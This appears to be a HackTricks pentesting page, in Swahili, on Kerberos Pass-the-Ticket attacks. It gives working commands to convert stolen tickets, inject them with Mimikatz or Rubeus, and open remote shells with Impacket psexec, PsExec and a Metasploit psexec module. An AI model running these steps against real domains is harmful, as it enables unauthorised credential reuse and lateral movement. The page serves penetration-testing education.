# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Muhtasari

Katika shambulio la Pass-the-Ticket (PtT), mshambuliaji hutumia tiketi ya Kerberos iliyoibiwa kujithibitisha kama principal wa tiketi hiyo bila kuwa na nenosiri la akaunti hiyo. Ticket-granting ticket (TGT) inaweza kutumika kuomba service tickets, ilhali service ticket iliyoibiwa ina kikomo cha huduma inayolengwa na kipindi chake cha uhalali.<sup>[[1]](#references)</sup>

Kwa mbinu za kupata tiketi, tazama:

- [Kukusanya tiketi kutoka Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Kukusanya tiketi kutoka Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Kubadilisha Miundo ya Tiketi ya Linux na Windows

Kerberos caches mara nyingi huwa katika mfumo wa faili za MIT `ccache` kwenye Linux na faili za `.kirbi` kwenye Windows. `ticket_converter` hubadilisha miundo hii kwa kutumia tiketi ya ingizo na njia ya matokeo.<sup>[[2]](#references)</sup>

```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```

Kekeo pia hutoa zana za Kerberos ticket kwenye Windows.<sup>[[3]](#references)</sup>

## Kutumia Ticket

Kwenye Linux, elekeza `KRB5CCNAME` kwenye cache na uelekeze mteja wa Impacket atumie Kerberos bila kuuliza nenosiri:<sup>[[4]](#references)</sup>

```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

Kwenye Windows, Mimikatz au Rubeus zinaweza kuingiza tiketi ya `.kirbi` kwenye kikao cha sasa cha logon. Tumia `klist` kukagua akiba inayotokana.<sup>[[5]](#references)[[6]](#references)</sup>

```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```

Kuingiza ticket hakutoi ruhusa zaidi ya zile zinazowakilishwa na ticket na sera ya uidhinishaji ya service lengwa. Ticket zilizokwisha muda wake, zilizofutwa, zenye muundo usio sahihi, au zenye scope isiyo sahihi zinaweza kushindwa.<sup>[[1]](#references)</sup>

Kwa muktadha mpana wa mashambulizi ya Kerberos na mbinu zinazohusiana za kupata ticket, tazama mwongozo wa mashambulizi ya Kerberos wa Tarlogic.<sup>[[7]](#references)</sup>

### Kutumia tena ticket ya nje katika Metasploit

Metasploit haisomi `KRB5CCNAME` ya Impacket kiotomatiki kwa modules zake za Kerberos. Ipe module faili ya **ccache** kupitia chaguo lake la `::Krb5Ccname` linalohusu protocol. Weka `::Rhostname` kuwa hostname ya SPN ya lengwa na domain kuwa domain ya lengwa; `RHOST` bado inaweza kuwa IP ya lengwa. Hii huruhusu kutumia ticket ambayo tayari imepatikana bila kuingiza nenosiri la akaunti.<sup>[[8]](#references)</sup>

Ikihitajika, badilisha `.kirbi` kuwa ccache kwanza.<sup>[[9]](#references)</sup>

Kwa mfano, ukiwa na ticket ya akaunti iliyoruhusiwa kuunda services kwenye lengwa, endesha [SMB PsExec module](../lateral-movement/psexec-and-winexec.md) ukitumia cache hiyo:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>

```text
use exploit/windows/smb/psexec
set RHOST 192.0.2.20
set SMBUser Administrator
set SMBDomain corp.example
set SMB::Auth kerberos
set SMB::Rhostname server.corp.example
set SMB::Krb5Ccname /path/to/administrator.ccache
set DomainControllerRhost 192.0.2.10
run
```

Metasploit huchagua kwanza tiketi ya huduma inayolingana kutoka kwenye cache iliyotolewa. Ikiwa inapata TGT pekee, huomba tiketi ya huduma kutoka kwa KDC, kwa hivyo njia hiyo pia inahitaji muunganisho wa DC. Cache iliyo na tiketi za huduma pekee haitoi ufikiaji wa hosts zisizohusiana. Kwa modules nyingine zinazotumika, badilisha kiambishi awali cha chaguo (kwa mfano, `Winrm::Krb5Ccname` kwa [WinRM](../lateral-movement/winrm.md)).<sup>[[8]](#references)</sup>



## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Mifano ya Impacket](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Mbinu za mashambulizi ya Kerberos](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [8] [Metasploit - Uthibitishaji wa huduma](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/service_authentication.html)
- [9] [Metasploit - Kubadilisha faili za kirbi na ccache](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/ticket_converter.html)
- [10] [Utekelezaji wa Kerberos katika mteja wa SMB wa Metasploit](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/smb/client.rb)
{{#include ../../banners/hacktricks-training.md}}
